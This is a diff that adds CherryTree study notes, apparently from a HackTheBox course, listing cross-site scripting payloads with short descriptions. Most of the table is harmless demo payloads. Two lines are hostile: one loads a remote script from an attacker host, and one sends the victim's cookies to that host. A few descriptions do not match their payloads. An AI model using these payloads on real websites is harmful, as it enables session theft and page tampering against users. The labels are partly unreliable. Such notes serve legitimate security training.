@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="10" master_id="0" name="Basic Payloads" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747092016" ts_lastsave="1747093004">
+    <rich_text>All Payloads:&#13;
+	PayloadsAllTheThings/XSS Injection/README.md at master ยท swisskyrepo/PayloadsAllTheThings&#13;
+&#13;
+Commands for xss&#13;
+&#13;
+</rich_text>
+    <table char_offset="130" justification="left" col_min="750" col_max="750" col_widths="0,0" is_light="1">
+      <row>
+        <cell>&lt;plaintext&gt; </cell>
+        <cell>Basic XSS Payload </cell>
+      </row>
+      <row>
+        <cell>&lt;script&gt;print()&lt;/script&gt; </cell>
+        <cell>Basic XSS Payload </cell>
+      </row>
+      <row>
+        <cell>&lt;img src="" onerror=alert(window.origin)</cell>
+        <cell>Change Background Color</cell>
+      </row>
+      <row>
+        <cell>&lt;script&gt;document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"&lt;/script&gt;</cell>
+        <cell>Change Background Image</cell>
+      </row>
+      <row>
+        <cell>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</cell>
+        <cell>Change Website Title</cell>
+      </row>
+      <row>
+        <cell>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</cell>
+        <cell>Overwrite website's main body</cell>
+      </row>
+      <row>
+        <cell>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</cell>
+        <cell>Remove certain HTML element</cell>
+      </row>
+      <row>
+        <cell>&lt;script src="http://OUR_IP/script.js"&gt;&lt;/script&gt;</cell>
+        <cell>Load remote script</cell>
+      </row>
+      <row>
+        <cell>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</cell>
+        <cell>Send Cookie details to us</cell>
+      </row>
+      <row>
+        <cell></cell>
+        <cell></cell>
+      </row>
+      <row>
+        <cell></cell>
+        <cell></cell>
+      </row>
+      <row>
+        <cell></cell>
+        <cell></cell>
+      </row>
+      <row>
+        <cell></cell>
+        <cell></cell>
+      </row>
+      <row>
+        <cell></cell>
+        <cell></cell>
+      </row>
+      <row>
+        <cell>&lt;script&gt;alert(window.origin)&lt;/script&gt; </cell>
+        <cell>Basic XSS Payload </cell>
+      </row>
+    </table>
+  </node>
+</cherrytree>
